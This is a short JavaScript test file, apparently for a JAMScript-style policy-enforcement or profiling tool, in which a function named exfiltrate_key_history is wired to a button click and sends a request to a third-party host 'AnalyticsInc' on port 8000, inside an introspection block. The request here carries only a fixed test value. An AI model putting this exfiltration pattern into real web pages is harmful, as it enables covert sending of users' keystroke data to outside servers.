
JAM.startProfile('load');
function exfiltrate_key_history() {
  xmlhttp = new XMLHttpRequest;
  introspect(JAMScript.introspectors.processC545F199BE443C5FB0DC91C55134FB746FD8B074) {
    xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=baseline", true)
  }
  xmlhttp.send(null);
  return
}
var v0 = document.getElementById("test");
v0.onclick = exfiltrate_key_history;

JAM.stopProfile('load');
